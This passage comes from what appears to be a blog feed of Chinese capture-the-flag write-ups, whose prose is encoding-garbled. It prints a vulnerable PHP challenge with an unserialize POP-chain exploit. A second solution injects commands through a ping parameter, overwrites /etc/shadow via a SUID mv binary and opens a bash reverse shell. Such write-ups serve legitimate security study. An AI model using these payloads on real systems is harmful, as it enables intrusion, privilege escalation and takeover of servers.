class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mason</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$temp</span>=<span class="variable language_">$this</span>-&gt;bro;</span><br><span class="line">        <span class="variable">$temp</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;qwe = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;bro = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ethan</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;asd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;aer = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;asd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chloe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dfg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hjk</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$say</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hjk = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dfg = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;power = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;say = <span class="string">&quot;I want sleep&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;say;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;power-&gt;hello;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fu =<span class="keyword">new</span> <span class="class"><span class="keyword">class</span>() </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I want sleep&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grace</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ou</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ou = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$good</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable language_">$this</span>-&gt;ou;</span><br><span class="line">        <span class="variable">$temp</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hjkl&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$hjkl</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hjkl&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$hjkl</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‰é¢çš„é“¾å­æŒºç®€å•çš„å°±ä¸åˆ†æäº†ï¼Œå…³é”®æ˜¯å¦‚ä½•å»è§¦å‘backdoorè¿™ä¸ªæ–¹æ³•ï¼Ÿ</p><p><strong>åˆ†é“¾å­æ‰“æ³•åŠ &amp;å¼•ç”¨</strong></p><p>æ‰€è°“åˆ†é“¾å­å°±æ˜¯é“¾å­ä¸€åˆ†ä¸ºäºŒå‘—ï¼Œå¼•ç”¨å°±æ˜¯å…±äº«åŒä¸€å†…å­˜ï¼Œè¿™æ„å‘³ç€ï¼Œåªè¦å†…å­˜å‘ç”Ÿå˜åŒ–ï¼Œ&amp;å¼•ç”¨ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–</p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mason</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ethan</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chloe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$say</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grace</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ou</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Mason</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Ethan</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Chloe</span>();</span><br><span class="line"><span class="variable">$c2</span> = <span class="keyword">new</span> <span class="title class_">Chloe</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Grace</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;bro = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;asd = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;say = <span class="variable">$c2</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;power = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;ou = [&amp;<span class="variable">$c2</span>-&gt;fu,<span class="string">&#x27;backdoor&#x27;</span>];     <span class="comment">//callableçš„å½¢å¼å»è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•</span></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>));</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆä¸»è¦æœ‰ä¸¤ä¸ªç–‘é—®ï¼š</p><p>1.åœ¨è§¦å‘<code>__toString</code>æ–¹æ³•çš„æ—¶å€™ä¸ºä»€ä¹ˆè¿˜è¦å¤šåˆ›å»ºä¸€ä¸ª<code>$c2 = new Chloe();</code>å¯¹è±¡ï¼Ÿ</p><p>2.ä¸ºä»€ä¹ˆåœ¨åˆ›å»ºæ•°ç»„callableçš„æ—¶å€™ç¬¬ä¸€ä¸ªå…ƒç´ è¦åŠ ä¸Š&amp;ï¼Ÿ</p><p>å¯¹äºç¬¬ä¸€ä¸ªè¿™å°±æ˜¯æˆ‘è¯´çš„åˆ†é“¾å­ï¼Œæ˜¯ä¸ºäº†è®©é“¾å­çš„ç»“æ„æ›´åˆ†æ˜ï¼é‚£ä¸ºä»€ä¹ˆè¦åŠ &amp;å‘¢ï¼Ÿ</p><p>è¿™å…¶å®æ˜¯ä¸€ä¸ª<strong>å…ˆåé¡ºåº</strong>çš„é—®é¢˜ï¼å‡è®¾æ²¡æœ‰è¿™ä¸ª&amp;<code>$d-&gt;ou = [$c2-&gt;fu,&#39;backdoor&#39;];</code>ä½ è¿™ä¸ªçš„ç¬¬ä¸€ä¸ªå…ƒç´ å°±æ˜¯nullï¼Œæœ‰&amp;è¿™ä¸ªé‚£ä¹ˆå°±æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ ä¸<code>$c2-&gt;fu</code>å…±äº«åŒä¸€å†…å­˜åœ°å€ï¼Œé‚£ä¹ˆåœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±æ˜¯&amp;nullï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–ä¹‹åä¼šè§¦å‘<code>__toString</code>ä»è€Œå®ç°<code>$c2-&gt;fu</code>å°±æ˜¯ä¸€ä¸ªå¯¹è±¡äº†ï¼</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹ï¼š1ï¼Œåˆ†é“¾å­ 2ï¼Œcallable 3ï¼Œå¼•ç”¨å†…å­˜å…±äº«</span><br></pre></td></tr></table></figure><h2 id="è¶…çº§ping"><a href="#è¶…çº§ping" class="headerlink" title="è¶…çº§ping"></a>è¶…çº§ping</h2><p><img src="/images/achieve/2025/10/1.png"></p><p>ç›´æ¥å°±æœ‰shelläº†ï¼é‚£ä¼šä¸ä¼šæ˜¯æ²¡æƒé™å‘¢ï¼Ÿ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&quot;fl*&quot;</span></span><br></pre></td></tr></table></figure><p>æ‰¾äº†ä¼¼ä¹æ²¡æœ‰ï¼Œé‚£åªèƒ½è€ƒè™‘åœ¨å½“å‰ç”¨æˆ·æ²¡æœ‰æƒé™çš„ç›®å½•ä¸‹äº†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwx------   1 root root 4096 Oct 21 06:33 root</span><br></pre></td></tr></table></figure><p>æœç„¶è¿™ä¸ªç›®å½•å°±åªç»™äº†æ–‡ä»¶æ‰€æœ‰è€…æƒé™</p><p>å°è¯•suidææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/mv</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨mvææƒï¼šæ„é€ æ¶æ„æ–‡ä»¶ï¼Œç„¶åmvç§»åŠ¨æ±¡æŸ“&#x2F;etc&#x2F;shadow(è¿™æ˜¯å­˜å‚¨ç”¨æˆ·å¯†ç çš„åœ°æ–¹)</p><p>æ„é€ åŠ ç›åŠ å¯†çš„å¯†ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt flag root</span><br><span class="line">openssl passwdï¼šopenssl å·¥å…·ä¸­ç”¨äºç”Ÿæˆå¯†ç å“ˆå¸Œçš„å­å‘½ä»¤</span><br><span class="line">-1ï¼šæŒ‡å®šä½¿ç”¨ MD5 ç®—æ³•æ¥ç”Ÿæˆå“ˆå¸Œï¼Œè¿™æ˜¯ Linux ç³»ç»Ÿä¸­å¸¸è§ä¸”å…¼å®¹çš„æ ¼å¼ï¼ˆé€šå¸¸ä»¥ $1$ å¼€å¤´ï¼‰</span><br><span class="line"><span class="comment">#$1$flag$Qiv1fGuuojJhoMNhwWehP.</span></span><br><span class="line">æœ€ç»ˆè¦å†™çš„ï¼šroot:$1$flag<span class="variable">$Qiv1fGuuojJhoMNhwWehP</span>.:18000:0:99999:7:::</span><br></pre></td></tr></table></figure><p>å†™å…¥æ–‡ä»¶ï¼ˆå¯»æ‰¾å¯å†™ç›®å½•ï¼‰ï¼š</p><p><img src="/images/achieve/2025/10/1.png"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?host=127.0.0.1;echo &#x27;root:<span class="built_in">$</span>1<span class="built_in">$</span>flag<span class="built_in">$</span>Qiv1fGuuojJhoMNhwWehP.:18000:0:99999:7:::&#x27; &gt; /home/ctfuser/txt</span><br><span class="line"></span><br><span class="line">?host=127.0.0.1;/usr/bin/mv /home/ctfuser/txt /etc/shadow</span><br><span class="line"></span><br><span class="line">?host=127.0.0.1;bash -c &quot;bash -i &gt;<span class="built_in">&amp;</span>/dev/tcp/ip/port 0&gt;<span class="built_in">&amp;</span>1&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/achieve/2025/10/3.png"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è€ƒç‚¹ï¼šsuid mvææƒ</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€é¢˜æ¯”èµ›æ—¶æ²¡çœ‹å°±æ‡’å¾—å†™äº†ï¼</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpååºåˆ—åŒ– </tag>
            
            <tag> suidææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–°çš„å¼€å§‹</title>
      <link href="/2025/10/23/hello-world/"/>
      <url>/2025/10/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/achieve/2025/10/start.jpg"></p><p>æ—©å°±æƒ³å¼„ä¸ªblogè®°å½•å­¦ä¹ äº†ï¼Œä½†æ˜¯ä¹‹å‰ä¸€ç›´è§‰å¾—éº»çƒ¦å°±ä¸€ç›´åœ¨csdnå‘</p><p><a href="https://blog.csdn.net/2403_88003384?spm=1000.2115.3001.5343">rufeii_-CSDNåšå®¢</a></p><p>ä½†æ˜¯csdnè¿™bydå¹¿å‘Šå¤ªå¤šäº†ï¼Œå¦å¤–å°±æ˜¯å®ƒçš„æœç´¢æ£€ç´¢æœ‰é—®é¢˜ï¼Œäºæ˜¯å°±è§‰å¾—ä¸èƒ½å†æ‹–äº†ï¼</p><p>è‡ªå·±è¿˜æ˜¯å¤ªèœäº†ï¼Œæ¯å¤©è¿›æ­¥ä¸€ç‚¹ç‚¹å§ï¼Œå¦å¤–å°±æ˜¯æ…¢æ…¢åœ°å­¦ï¼Œä¸è¦æ€¥äºæ±‚æˆï¼</p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®°å½• </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
